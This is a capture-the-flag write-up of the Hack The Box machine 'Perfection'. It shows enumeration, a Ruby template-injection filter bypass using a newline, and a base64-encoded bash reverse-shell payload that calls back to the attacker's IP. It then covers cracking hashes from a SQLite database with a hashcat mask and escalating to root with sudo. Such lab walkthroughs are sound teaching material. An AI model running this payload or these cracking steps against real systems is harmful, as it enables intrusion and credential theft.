---
title: HTB - Perfection
date: 2024-07-07 00:00:00 + 1000
categories: [Web App, CTF,HTB]
tags: [htb,WebExploitation, SSTI, SQLite]
comments: false
---


The Perfection HTB easy rated-machine which involved exploiting a Server-Side Template Injection (SSTI) vulnerability in a web app to gain initial access as the "susan" user. This user's credentials were then cracked using Hashcat to gain root privileges via `sudo`

## Common Enumeration
### Namp

Running the `nmap -p- -sC -sV -oA recon/allport 10.10.11.253 --open` - Found two ports: SSH (port 22) and HTTP (port 80) and The HTTP service was running Nginx

```bash
$ nmap -p- -sC -sV -oA recon/allport 10.10.11.253 --open
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-30 17:15 AEST
Nmap scan report for 10.10.11.253
Host is up (0.0059s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 80:e4:79:e8:59:28:df:95:2d:ad:57:4a:46:04:ea:70 (ECDSA)
|_  256 e9:ea:0c:1d:86:13:ed:95:a9:d0:0b:c8:22:e4:cf:e9 (ED25519)
80/tcp open  http    nginx
|_http-title: Weighted Grade Calculator
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.60 seconds
```

### Gobuster

Gobuster - Nothing interesting found 

```bash
$ gobuster dir -u http://10.10.11.253 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.253
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/about                (Status: 200) [Size: 3827]
/.                    (Status: 200) [Size: 3842]
Progress: 43007 / 43008 (100.00%)
===============================================================
Finished
===============================================================
```

### Web Reconnaissance

I pointed my browser at `http://10.10.11.253/` and saw a simple home page but then I noticed `/weighted-grade-calc`, a path that looked like a juicy target

![img](/assets/img/Perfection/1.webp)

The page mentioned it was powered by WEBrick 1.7.0, a Ruby web server. A quick Google search for "WEBrick vulnerabilities" turned up some interesting results. I found a known Server-Side Template Injection (SSTI) vulnerability in that version - [webrick vulnerabilities](https://security.snyk.io/package/rubygems/webrick)

![img](/assets/img/Perfection/2.webp)

I tried a few common SSTI payloads, but they were blocked

![img](/assets/img/Perfection/3.webp)

After a bit more digging, I stumbled upon a [technique for bypassing](https://davidhamann.de/2022/05/14/bypassing-regular-expression-checks/) regular expression checks, using a newline character (`%0A`). I tried it out, and... success!

![img](/assets/img/Perfection/4.webp)

## Shell as Susan

Now that I had a way to bypass the web app's defenses, I set up a listener on my machine, crafted a reverse shell payload, and injected it into the web app

```bash
a%0A<%25%3d+`echo+L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEwLjE0LjkvMTMzNyAwPiYx|base64+-d|bash`+%25>
```

It worked! I had a shell as a user named "susan". It was a good start

```bash
$ nc -lvnp 1337
listening on [any] 1337 ...
connect to [10.10.14.9] from (UNKNOWN) [10.10.11.253] 41800
bash: cannot set terminal process group (991): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.1$ whoami
whoami
susan
bash-5.1$ 
```

I upgraded my shell to a more interactive one using Python

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo; fg
export TERM=xterm
```

user.txt

```test
b6958b4ef355e9f03c9594a65dafd1be
```

### Enumeration for Privilege Escalation

So looking at Susan's home directory I see two juicy folders: `Migration` and `ruby_app`

```bash
bash-5.1$ ls
Migration  ruby_app  user.txt
bash-5.1$ 
```

BAM! A SQLite database named `pupilpath_credentials.db`. This is looking promising

```bash
bash-5.1$ ls
pupilpath_credentials.db
bash-5.1$ 
```

I opened the database and found a hash, which looked like it might be a user password. I needed to crack it

```bash
sqlite> select * from users;
1|Susan Miller|abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f
2|Tina Smith|dd560928c97354e3c22972554c81901b74ad1b35f726a11654b78cd6fd8cec57
3|Harry Tyler|d33a689526d49d32a01986ef5a1a3d2afc0aaee48978f06139779904af7a6393
4|David Lawrence|ff7aedd2f4512ee1848a3e18f86c4450c1c76f5c6e27cd8b0dc05557b344b87a
5|Stephen Locke|154a38b253b4e08cba818ff65eb4413f20518655950b9a39964c18d7737d9bb8
sqlite> 
```

So I've uploaded uploaded and fired up `linpeas` and it spat out a juicy nugget: `/var/mail/susan`

```bash
bash-5.1$ pwd
/var/mail
bash-5.1$ ls
susan
bash-5.1$ cat susan 
Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:

{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}

Note that all letters of the first name should be convered into lowercase.

Please hit me with updates on the migration when you can. I am currently registering our university with the platform.

- Tina, your delightful student
bash-5.1$ 
```

Alright, so I've got this password pattern: "{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}". It's a classic password pattern, easy for the user but ripe for cracking

```bash
$ hashcat -m 1400 hash -a 3 -d 1 susan_nasus_?d?d?d?d?d?d?d?d?d --show
abeb6f8eb5722b8ca3b45f6f72a0cf17c7028d62a15a30199347d9d74f39023f:susan_nasus_413759210
```

And there it is! `hashcat` spits out the password: `susan_nasus_413759210`
## Shell as root

I checked Susan's `sudo` configuration to see if she had any permissions to run commands as root

```bash
-bash-5.1$ sudo -l
Matching Defaults entries for susan on perfection:
   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User susan may run the following commands on perfection:
   (ALL : ALL) ALL
```

### ### Sudo to su

I used `sudo su` and I was in!

```bash
-bash-5.1$ sudo su
root@perfection:/home/susan# whoami
root
root@perfection:/home/susan# cat /root/root.txt 
d64491faf42d2eaebe64995eded12a46
root@perfection:/home/susan# 
```

root.txt

```text
d64491faf42d2eaebe64995eded12a46
```